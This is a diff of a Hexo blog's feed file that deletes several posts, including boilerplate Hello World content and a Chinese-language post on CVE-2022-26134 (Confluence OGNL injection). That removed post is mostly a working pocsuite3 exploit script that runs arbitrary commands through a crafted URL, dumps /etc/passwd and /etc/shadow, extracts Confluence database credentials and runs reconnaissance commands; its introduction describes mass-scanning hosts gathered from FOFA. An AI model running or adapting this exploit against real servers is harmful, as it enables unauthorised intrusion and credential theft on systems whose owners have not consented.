@@ -4,59 +4,6 @@
   
     
     <entry>
-      <title></title>
-      <link href="/2023/12/10/%E6%96%B0%E5%BB%BA%20Markdown/"/>
-      <url>/2023/12/10/%E6%96%B0%E5%BB%BA%20Markdown/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>test</title>
-      <link href="/2023/12/10/test/"/>
-      <url>/2023/12/10/test/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2023/12/10/hello-world/"/>
-      <url>/2023/12/10/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Hexo </tag>
-            
-            <tag> git </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Java/Python/PHP Memory WebShell</title>
       <link href="/2023/08/08/Memory_WebShell/"/>
       <url>/2023/08/08/Memory_WebShell/</url>
@@ -69,25 +16,6 @@
           <category> security </category>
           
           <category> tools </category>
-          
-      </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CVE-2022-26134 Confluence OGNL injection</title>
-      <link href="/2023/01/28/index/"/>
-      <url>/2023/01/28/index/</url>
-      
-        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>尽管这个漏洞出来有一段时间了，但是利用pocsuite批量扫描通过fofa自动化爬虫脚本获取到的url，发现还是有不少机子存在此漏洞。漏洞原理是在未经身份验证的情况下，可以构造OGNL表达式进行注入，实现在Confluence Server或Data Center上执行任意代码。</p><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><img src="/images/63d53e47face21e9efc1dd9e.png"></p><h2 id="项目信息"><a href="#项目信息" class="headerlink" title="项目信息"></a>项目信息</h2><p>Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。</p><p>Confluence 已经在超过100个国家，13500个组织中成功地应用于企业内网平台、知识管理及文档管理，涉及财富1000企业、政府机构、教育机构、财务金融机构及技术研究领域。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>#!&#x2F;usr&#x2F;bin&#x2F;env python3<br># -*- coding: utf-8 -*-<br>​<br>import re<br>import random<br>import urllib<br>import hashlib<br>import json<br>import time<br>from lxml import etree<br>import urllib.request<br>from urllib.parse import urlparse<br>from pocsuite3.api import (<br>    minimum_version_required, POCBase, register_poc, requests, logger,<br>    OptString, OrderedDict,<br>    random_str, Output,<br>    get_listener_ip, get_listener_port, REVERSE_PAYLOAD<br>)<br>​<br>​<br>​<br>class PoC(POCBase):<br>    vulID &#x3D; ‘0’<br>    version &#x3D; ‘1’<br>    author &#x3D; ‘rainb0w’<br>    vulDate &#x3D; ‘2022-06-03’<br>    createDate &#x3D; ‘2023-01-16’<br>    updateDate &#x3D; ‘2023-01-16’<br>    references &#x3D; []<br>    name &#x3D; ‘Atlassian Confluence Pre-Auth Code Execution (CVE-2022-26134)’<br>    appPowerLink &#x3D; ‘<a href="https://www.atlassian.com/software/confluence">https://www.atlassian.com/software/confluence</a>‘<br>    appName &#x3D; ‘Confluence’<br>    appVersion &#x3D; ‘&lt; 7.4.17,&lt; 7.13.7,&lt; 7.14.3,&lt; 7.15.2,&lt; 7.16.4,&lt; 7.16.4,&lt; 7.18.1,&gt;&#x3D; 1.3.0’<br>    vulType &#x3D; ‘Code Execution’<br>    desc &#x3D; ‘Vulnerability description’<br>    samples &#x3D; [‘’]<br>    install_requires &#x3D; [‘’]<br>    pocDesc &#x3D; ‘User manual of poc’<br>    dork &#x3D; {‘zoomeye’: ‘’}<br>    suricata_request &#x3D; ‘’<br>    suricata_response &#x3D; ‘’<br>​<br>​<br>    def get_profile_location_for_linux(self):<br>        pattern &#x3D; re.compile(‘confluence.home &#x3D; (.+)’)<br>        profileLocation &#x3D; re.findall(pattern, self._exploit(‘cat &#x2F;opt&#x2F;atlassian&#x2F;confluence&#x2F;confluence&#x2F;WEB-INF&#x2F;classes&#x2F;confluence-init.properties’))[0]+’&#x2F;confluence.cfg.xml’<br>        return profileLocation<br>​<br>​<br>​<br>    def solve_profile_location_for_linux(self,profileLocation):<br>        profilecontent &#x3D; self._exploit(‘cat {0}’.format(profileLocation))<br>        pattern_dbpass &#x3D; re.compile(‘<property name="hibernate.connection.password">(.*?)</property>‘)<br>        pattern_dburl &#x3D; re.compile(‘<property name="hibernate.connection.url">(.*?)</property>‘)<br>        pattern_dbusername &#x3D; re.compile(‘<property name="hibernate.connection.username">(.*?)</property>‘)<br>        db_pass &#x3D; re.findall(pattern_dbpass,profilecontent)[0]<br>        db_url &#x3D; re.findall(pattern_dburl,profilecontent)[0]<br>        db_username &#x3D; re.findall(pattern_dbusername,profilecontent)[0]<br>        return db_pass, db_url, db_username<br>​<br>​<br>    def repeatExecute(self, command):<br>        temp_result &#x3D; self._exploit(‘cmd &#x2F;c {}’.format(command))<br>        for i in range(10):<br>            if temp_result !&#x3D; ‘’:<br>                break<br>            temp_result &#x3D; self._exploit(‘cmd &#x2F;c {}’.format(command))<br>        return temp_result<br>​<br>​<br>​<br>    def _exploit(self, command):<br>​<br>        headers &#x3D; {‘Content-Type’: ‘application&#x2F;x-www-form-urlencoded’}<br>        url &#x3D; self.url+’&#x2F;%24%7B%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22’+command+’%22%29.getInputStream%28%29%2C%22utf-8%22%29%29%29%7D&#x2F;‘<br>        r &#x3D; requests.get(url, headers&#x3D;headers, verify&#x3D;False, allow_redirects&#x3D;False, timeout&#x3D;10)<br>        if ‘X-Cmd-Response’ in r.headers:<br>            return r.headers[‘X-Cmd-Response’]<br>        else:<br>            return ‘None’<br>​<br>​<br>    def _verify(self):<br>        result &#x3D; {}<br>        self.raw_url &#x3D; self.url<br>        self.host &#x3D; urlparse(self.url).hostname<br>        self.port &#x3D; urlparse(self.url).port<br>        try:<br>            result[“url”] &#x3D; self.url<br>​<br>​<br>            # Web网站相关信息<br>            r &#x3D; requests.get(self.url)<br>            pattern &#x3D; re.compile(‘<title>(.+)</title>‘)<br>            title_result &#x3D; re.findall(pattern, r.text)[0]<br>            result[“web”] &#x3D; {<br>                # 网站默认首页的title信息（可能含有单位或组织信息）<br>                “title”:title_result<br>            }<br>​<br>​<br>            random_num &#x3D; str(random.randint(10000000,99999999))<br>            temp_result_linux &#x3D; self._exploit(“echo {}”.format(random_num))<br>            temp_result_win &#x3D; self._exploit(“cmd &#x2F;c echo {}”.format(random_num))<br>​<br>​<br>            if(temp_result_linux &#x3D;&#x3D; random_num or temp_result_win &#x3D;&#x3D; random_num):<br>                #os信息<br>                result[‘uname -a’] &#x3D; self._exploit(‘uname -a’)<br>                if(result[‘uname -a’] !&#x3D; None):<br>​<br>                    #数据库信息,如数据库密码,数据库url,数据库账号<br>                    profileLocation &#x3D; self.get_profile_location_for_linux()<br>                    result[‘db_pass’], result[‘db_url’], result[‘db_username’] &#x3D; self.solve_profile_location_for_linux(profileLocation)<br>​<br>                    #读取MAC地址<br>                    result[‘MAC_Addr’] &#x3D; self._exploit(‘cat &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address’)<br>​<br>                    # 获取的文件信息<br>                    result[“files”] &#x3D; [<br>                        {“name”: “passwd”, “path”: “&#x2F;etc&#x2F;passwd”, “result”: self._exploit(‘cat &#x2F;etc&#x2F;passwd’)},<br>                        {“name”: “hosts”, “path”: “&#x2F;etc&#x2F;hosts”, “result”: self._exploit(‘cat &#x2F;etc&#x2F;hosts’)},<br>                        {“name”: “shadow”, “path”: “&#x2F;etc&#x2F;shadow”, “result”: self._exploit(‘cat &#x2F;etc&#x2F;shadow’)},<br>                        {“name”: “resolv,conf”, “path”: “&#x2F;etc&#x2F;resolv,conf”, “result”: self._exploit(‘cat &#x2F;etc&#x2F;resolv,conf’)},<br>                    ]<br>                    # 命令执行信息<br>                    result[“commands”] &#x3D; [<br>                        {“name”: “id”, “result”: self._exploit(‘id’)},<br>                        {“name”: “whoami”, “result”: self._exploit(‘whoami’)},<br>                        {“name”: “hostname”, “result”: self._exploit(‘hostname’)},<br>                        {“name”: “arp”, “result”: self._exploit(‘arp’)},<br>                        {“name”: “ifconfig”, “result”: self._exploit(‘ifconfig’)},<br>                    ]<br>                else:<br>                    result.pop(‘uname -a’)<br>​<br>                    result[“commands”] &#x3D; [<br>                        {“name”: “whoami”, “result”: “”},<br>                        {“name”: “route print”, “result”: “”},<br>                        {“name”: “arp -a”, “result”: “”},<br>                        {“name”: “ipconfig &#x2F;all”, “result”: “”},<br>                        {“name”: “hostname”, “result”: “”}<br>                    ]<br>                    result[“commands”][0][“result”] &#x3D; self.repeatExecute(result[“commands”][0][“name”])<br>                    result[“commands”][1][“result”] &#x3D; self.repeatExecute(result[“commands”][1][“name”])<br>                    result[“commands”][2][“result”] &#x3D; self.repeatExecute(result[“commands”][2][“name”])<br>                    result[“commands”][3][“result”] &#x3D; self.repeatExecute(result[“commands”][3][“name”])<br>                    result[“commands”][4][“result”] &#x3D; self.repeatExecute(result[“commands”][4][“name”])<br>​<br>            else:<br>                print(‘目标不存在此漏洞’)<br>                pass<br>​<br>        except Exception as e:<br>            pass<br>        return self.parse_output(result)<br>​<br>    def _attack(self):<br>        return self._verify()<br>​<br>​<br>    def parse_output(self, result):<br>        output &#x3D; Output(self)<br>        if len(result.keys()) !&#x3D; 0:<br>            json_result &#x3D; {<br>                “result”: {“json”: json.dumps(result)}<br>            }<br>            output.success(json_result)<br>        else:<br>            output.fail(‘Internet nothing returned’)<br>        return output<br>​<br>​<br>register_poc(PoC)<br>​</p><h2 id="POC执行结果"><a href="#POC执行结果" class="headerlink" title="POC执行结果"></a>POC执行结果</h2><h3 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h3><p><img src="/images/63c64ab3be43e0d30eb18073.jpg"></p><h3 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h3><p><img src="/images/63c64c22be43e0d30eb4468d.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>官方修复脚本：</p><p><a href="https://vmware-gs.my.salesforce.com/sfc/p/#f40000003u6t/a/5G0000002Nla/9COLfZG7uu8iDjLoZTis5Ltzmd1H87iToXs9uLZF8IU">https://vmware-gs.my.salesforce.com/sfc/p/#f40000003u6t/a/5G0000002Nla/9COLfZG7uu8iDjLoZTis5Ltzmd1H87iToXs9uLZF8IU</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> cve </category>
           
       </categories>
       
